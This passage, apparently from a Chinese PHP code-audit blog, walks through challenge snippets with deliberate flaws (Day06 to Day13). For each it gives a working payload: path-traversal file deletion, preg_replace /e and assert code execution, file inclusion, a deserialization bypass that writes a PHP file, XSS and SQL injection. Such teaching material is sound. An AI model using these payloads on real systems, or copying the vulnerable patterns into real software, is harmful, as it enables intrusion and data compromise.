class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TokenStorage</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">performAction</span><span class="params">($action, $data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> ($action) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'create'</span>:</span><br><span class="line">                <span class="keyword">$this</span>-&gt;createToken($data);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'delete'</span>:</span><br><span class="line">                <span class="keyword">$this</span>-&gt;clearToken($data);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="comment">//throw new Exception('Unknown action');</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'Unknown action'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">createToken</span><span class="params">($seed)</span> </span>&#123;</span><br><span class="line">        $token = md5($seed);</span><br><span class="line">        file_put_contents(<span class="string">'/tmp/tokens/'</span> . $token, <span class="string">'...data'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">clearToken</span><span class="params">($token)</span> </span>&#123;</span><br><span class="line">        $file = preg_replace(<span class="string">"/[^a-z.-_]/"</span>, <span class="string">""</span>, $token);</span><br><span class="line">        unlink(<span class="string">'./tmp/tokens/'</span> . $file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$storage = <span class="keyword">new</span> TokenStorage();</span><br><span class="line">$storage-&gt;performAction($_GET[<span class="string">'action'</span>], $_GET[<span class="string">'data'</span>]);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这题可以利用的函数有<strong>file_put_contents</strong>和<strong>unlink</strong>，但是file_put_contents函数的参数$token经过md5加密，不好利用，在观察unlink函数，参数$token经过<strong>preg_replace</strong>函数进行正则匹配过滤，过滤的规则是<code>&quot;/[^a-z.-_]/&quot;</code>，本意应该是除了<code>a-z 和 . 和 - 和 _</code>的字符都被替换为空，但是这里的<code>-</code>是没有被转义的，在<code>[]</code>中<code>-</code>是表示范围的意思，所以这里过滤的应该是除了ascii46-95 , 97-122的字符。也就是说<code>.</code>和<code>/</code>字符都不会被过滤，那么我们就可以利用路径穿越进行任意文件删除</p><p>payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=delete&amp;data=../../demo2.php</span><br></pre></td></tr></table></figure><h2 id="Day07"><a href="#Day07" class="headerlink" title="Day07"></a>Day07</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUser</span><span class="params">($id)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $config, $db;</span><br><span class="line">    <span class="keyword">if</span>($id == <span class="keyword">false</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!is_resource($db)) &#123;</span><br><span class="line">        $db = <span class="keyword">new</span> MySQLi(</span><br><span class="line">            $config[<span class="string">'dbhost'</span>],</span><br><span class="line">            $config[<span class="string">'dbuser'</span>],</span><br><span class="line">            $config[<span class="string">'dbpass'</span>],</span><br><span class="line">            $config[<span class="string">'dbname'</span>]</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    $sql = <span class="string">"SELECT username FROM users WHERE id = ?"</span>;</span><br><span class="line">    $stmt = $db-&gt;prepare($sql);</span><br><span class="line">    $stmt-&gt;bind_param(<span class="string">'i'</span>, $id);</span><br><span class="line">    $stmt-&gt;bind_result($name);</span><br><span class="line">    $stmt-&gt;execute();</span><br><span class="line">    $stmt-&gt;fetch();</span><br><span class="line">    <span class="keyword">return</span> $name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$var = parse_url($_SERVER[<span class="string">'HTTP_REFERER'</span>]);</span><br><span class="line">parse_str($var[<span class="string">'query'</span>]);</span><br><span class="line">$currentUser = getUser($id);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;h1&gt;'</span>.htmlspecialchars($currentUser).<span class="string">'&lt;/h1&gt;'</span>;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这关考察的通过<strong>parse_url</strong>和<strong>parse_str</strong>函数导致的<strong>变量覆盖</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$var = parse_url(<span class="string">"https://127.0.0.1/?a=1&amp;b=2"</span>);</span><br><span class="line">print_r($var); <span class="comment">#Array ( [scheme] =&gt; https [host] =&gt; 127.0.0.1 [path] =&gt; / [query] =&gt; a=1,b=2 )</span></span><br><span class="line">parse_str($var[<span class="string">'query'</span>]); <span class="comment"># $a == 1 , $b == 2</span></span><br></pre></td></tr></table></figure><p>parse_url中的参数来自HTTP请求头部的<code>Referer</code>字段，是可控的，那么我们就可以控制<strong>getUser</strong>类中的$config和$db来在我们自己构造的数据库中进行查询</p><p>payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/html/day7.php?config[dbhost]=127.0.0.1&amp;config[dbuser]=root&amp;config[dbpass]=root&amp;config[dbname]=security&amp;id=1</span><br></pre></td></tr></table></figure><h2 id="Day08"><a href="#Day08" class="headerlink" title="Day08"></a>Day08</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET) || $_GET == <span class="keyword">false</span>)&#123;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complexStrtolower</span><span class="params">($regex, $value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(</span><br><span class="line">        <span class="string">'/('</span> . $regex . <span class="string">')/ei'</span>,</span><br><span class="line">        <span class="string">'strtolower("\\1")'</span>,</span><br><span class="line">        $value</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $regex =&gt; $value) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complexStrtolower($regex, $value) . <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>考察的是<strong>preg_replace/e</strong>函数导致的<strong>命令执行</strong>漏洞，我之前的文章（<a href="https://foxgrin.github.io/posts/41464/">代码审计-通过preg_replace函数深入命令执行</a>）有详细写到过这题</p><p>主要思路就是通过GET方式传入的变量名作为正则匹配条件，将匹配的值value传递到strtolower函数中进行命令执行，<code>&quot;\\1&quot;</code>即为第一个匹配到的字符串。</p><p>Payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?\S*=&#123;$&#123;phpinfo()&#125;&#125;</span><br></pre></td></tr></table></figure><p><code>\S</code>代表除空白符以外的所有字符，控制$value所有字符都会被匹配到，<code>{${phpinfo()}}</code>则涉及到PHP双引号下的变量会被解析和PHP可变变量</p><h2 id="Day09"><a href="#Day09" class="headerlink" title="Day09"></a>Day09</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LanguageManager</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadLanguage</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $lang = <span class="keyword">$this</span>-&gt;getBrowserLanguage();</span><br><span class="line">        $sanitizedLang = <span class="keyword">$this</span>-&gt;sanitizeLanguage($lang);</span><br><span class="line">        <span class="keyword">if</span>(file_exists(<span class="string">"./lang/$sanitizedLang"</span>))&#123;</span><br><span class="line">        <span class="keyword">require_once</span>(<span class="string">"./lang/$sanitizedLang"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">getBrowserLanguage</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $lang = <span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_ACCEPT_LANGUAGE'</span>]) ? $_SERVER[<span class="string">'HTTP_ACCEPT_LANGUAGE'</span>] :<span class="string">'en'</span>;</span><br><span class="line">        <span class="keyword">return</span> $lang;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizeLanguage</span><span class="params">($language)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> str_replace(<span class="string">'../'</span>, <span class="string">''</span>, $language);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$manage = <span class="keyword">new</span> LanguageManager();</span><br><span class="line">$manage-&gt;loadLanguage();</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>考察的是任意<strong>文件包含</strong>漏洞，参数<code>$_SERVER[&#39;HTTP_ACCEPT_LANGUAGE&#39;]</code>可控，过滤函数<strong>str_replace</strong>只对<code>../</code>做一次过滤，双写即可绕过，Payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Accept-Language: ..././..././demo.txt</span><br></pre></td></tr></table></figure><h2 id="Day10"><a href="#Day10" class="headerlink" title="Day10"></a>Day10</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST) || $_POST == <span class="keyword">false</span>)&#123;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">goAway</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    error_log(<span class="string">"Hacking attempt."</span>);</span><br><span class="line">    header(<span class="string">'Location: /error/'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($pi) || !is_numeric($pi)) &#123;</span><br><span class="line">    goAway();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!assert(<span class="string">"(int)$pi == 3"</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"This is not pi."</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"This might be pi."</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然看到了<strong>extract</strong>，但是这题考察的不是变量覆盖，我们可以看到<code>goAway()</code>函数中<code>header</code>重定向后并未使用<code>die</code>或者<code>exit</code>，这就导致了后面的代码依然会执行，所以我们直接POST变量<code>pi=phpinfo</code>，就会执行<code>assert(&quot;(int)phpinfo() == 3&quot;)</code>，在burp中能phpinfo的信息</p><h2 id="Day11"><a href="#Day11" class="headerlink" title="Day11"></a>Day11</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $cacheFile = <span class="string">'/tmp/cachefile'</span>;</span><br><span class="line">    <span class="keyword">public</span> $template = <span class="string">'&lt;div&gt;Welcome back %s&lt;/div&gt;'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($data = null)</span> </span>&#123;</span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;loadData($data);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;render($data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadData</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (substr($data, <span class="number">0</span>, <span class="number">2</span>) !== <span class="string">'O:'</span></span><br><span class="line">        &amp;&amp; !preg_match(<span class="string">'/O:\d:/'</span>, $data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> unserialize($data);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> [];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">createCache</span><span class="params">($file = null, $tpl = null)</span> </span>&#123;</span><br><span class="line">        $file = $file ?? <span class="keyword">$this</span>-&gt;cacheFile;</span><br><span class="line">        $tpl = $tpl ?? <span class="keyword">$this</span>-&gt;template;</span><br><span class="line">        file_put_contents($file, $tpl);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> sprintf(</span><br><span class="line">            <span class="keyword">$this</span>-&gt;template,</span><br><span class="line">            htmlspecialchars($data[<span class="string">'name'</span>])</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;createCache();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> Template($_COOKIE[<span class="string">'data'</span>]);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>本题的正则表达式应修改为<code>&#39;/O:\d:/&#39;</code></p><p>看到<strong>unserialize</strong>就知道这题考察的是<strong>反序列化</strong>，对COOKIE中的变量<strong>data</strong>做了两个过滤处理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">substr($data, 0, 2) !== &apos;O:&apos;</span><br><span class="line">!preg_match(&apos;/O:\d:/&apos;, $data)</span><br></pre></td></tr></table></figure><p>php可反序列化类型有String,Integer,Boolean,Null,Array,Object。去除掉Object后，考虑采用数组中存储对象进行绕过。 </p><p>第二个正则匹配过滤，就需要利用到PHP反处理的源码，具体参考<a href="https://www.phpbug.cn/archives/32.html" target="_blank" rel="noopener">php反序列unserialize的一个小特性 </a>，在对象前加一个<code>+</code>号，即<code>O:14-&gt;O:+14</code>，这样就可以绕过正则匹配。</p><p>获取序列化字符串的代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $cacheFile = <span class="string">'./info.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> $template = <span class="string">'&lt;?php phpinfo();'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$temp[] = <span class="keyword">new</span> Template();</span><br><span class="line">$temp = serialize($temp);</span><br><span class="line"><span class="keyword">echo</span> $temp;</span><br></pre></td></tr></table></figure><p>获取payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;i:0;O:+8:&quot;Template&quot;:2:&#123;s:9:&quot;cacheFile&quot;;s:10:&quot;./info.php&quot;;s:8:&quot;template&quot;;s:16:&quot;&lt;?php phpinfo();&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure><p>这样，就可以利用file_put_contents函数将PHP代码写入一个PHP文件中</p><h2 id="Day12"><a href="#Day12" class="headerlink" title="Day12"></a>Day12</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$sanitized = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">    $sanitized[$key] = intval($value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$queryParts = array_map(<span class="function"><span class="keyword">function</span> <span class="params">($key, $value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $key . <span class="string">'='</span> . $value;</span><br><span class="line">&#125;, array_keys($sanitized), array_values($sanitized));</span><br><span class="line"></span><br><span class="line">$query = implode(<span class="string">'&amp;'</span>, $queryParts);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;a href='/images/size.php?"</span> .</span><br><span class="line">    htmlentities($query) . <span class="string">"'&gt;link&lt;/a&gt;"</span>;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>看到结尾的响应标签内容就猜到这题考察的可能是<strong>XSS</strong>，这里过滤的点有两个函数：（1）intval（2）htmlentities</p><p><strong>intval</strong>函数虽然过滤了$value，但是未过滤$key，我们通过$key进行XSS即可</p><p><strong>htmlentities</strong>函数作用是将字符串转化为HTML实体，但是默认不对单引号进行转义，所以我们可以构造一下Payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?&apos;onclick%3dalert(&apos;xss&apos;)//=1</span><br></pre></td></tr></table></figure><p>利用的是<code>a</code>标签的<code>onclick</code>事件来进行XSS攻击</p><p>闭合后的标签为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&lt;a href=&apos;/images/size.php?&apos;onclick=alert(&apos;xss&apos;)//=1&apos;&gt;link&lt;/a&gt;&quot;</span><br></pre></td></tr></table></figure><h2 id="Day13"><a href="#Day13" class="headerlink" title="Day13"></a>Day13</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"bootstrap.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST == <span class="keyword">false</span>)&#123;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoginManager</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $em;</span><br><span class="line">    <span class="keyword">private</span> $user;</span><br><span class="line">    <span class="keyword">private</span> $password;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($user, $password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;em = DoctrineManager::getEntityManager();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;user = $user;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValid</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $user = <span class="keyword">$this</span>-&gt;sanitizeInput(<span class="keyword">$this</span>-&gt;user);</span><br><span class="line">        $pass = <span class="keyword">$this</span>-&gt;sanitizeInput(<span class="keyword">$this</span>-&gt;password);</span><br><span class="line"></span><br><span class="line">        $queryBuilder = <span class="keyword">$this</span>-&gt;em-&gt;createQueryBuilder()</span><br><span class="line">            -&gt;select(<span class="string">'COUNT(u)'</span>)</span><br><span class="line">            -&gt;from(<span class="string">"User"</span>, <span class="string">"u"</span>)</span><br><span class="line">            -&gt;where(<span class="string">"u.user = '$user' AND u.password = '$pass'"</span>);</span><br><span class="line">        $query = $queryBuilder-&gt;getQuery();</span><br><span class="line">        <span class="keyword">return</span> boolval($query-&gt;getSingleScalarResult());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizeInput</span><span class="params">($input, $length = <span class="number">20</span>)</span> </span>&#123;</span><br><span class="line">        $input = addslashes($input);</span><br><span class="line">        <span class="keyword">if</span> (strlen($input) &gt; $length) &#123;</span><br><span class="line">            $input = substr($input, <span class="number">0</span>, $length);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $input;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$auth = <span class="keyword">new</span> LoginManager($_POST[<span class="string">'user'</span>], $_POST[<span class="string">'passwd'</span>]);</span><br><span class="line"><span class="keyword">if</span> (!$auth-&gt;isValid()) &#123;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Hello, '</span>.$_POST[<span class="string">'user'</span>];</span><br></pre></td></tr></table></figure><p>看到关键字user和passwd和SQL语句就很明白，这题考察的是通过<strong>SQL注入进行任意用户登录</strong></p><p>过滤的地方在于<strong>sanitizeInput</strong>函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizeInput</span><span class="params">($input, $length = <span class="number">20</span>)</span> </span>&#123;</span><br><span class="line">        $input = addslashes($input);</span><br><span class="line">        <span class="keyword">if</span> (strlen($input) &gt; $length) &#123;</span><br><span class="line">            $input = substr($input, <span class="number">0</span>, $length);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $input;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先对我们输入的用户名和密码值通过<strong>addslashes</strong>函数进行了<strong>转义</strong>处理，然后经过<strong>substr</strong>函数截断前<strong>20</strong>位。因为有转义，我们如果输入反斜杠<code>\</code>，经过转义后会变成<code>\\</code>，这样就不能过滤掉SQL语句中的单引号。但是，设想一下，如果我们输入的字符足够长，并且第二十位放置的是单引号<code>&#39;</code>或者反斜杠<code>\</code>，那么经过转义和截断，最后一位就一定会是一个反斜杠<code>\</code>，这就过滤了SQL语句中的单引号，造成SQL注入</p><p>Payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?user=1234567890123456789&apos;&amp;passwd= or 1=1#</span><br></pre></td></tr></table></figure><p>这样构成的SQL语句便是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT COUNT(u) FROM User u WHERE u.user = &apos;1234567890123456789\&apos; AND u.password = &apos; or 1=1#&apos;</span><br></pre></td></tr></table></figure><h2 id="Day14"><a href="#Day14" class="headerlink" title="Day14"></a>Day14</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Carrot</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> EXTERNAL_DIRECTORY = <span class="string">'/tmp/'</span>;</span><br><span class="line">    <span class="keyword">private</span> $id;</span><br><span class="line">    <span class="keyword">private</span> $lost = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> $bought = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    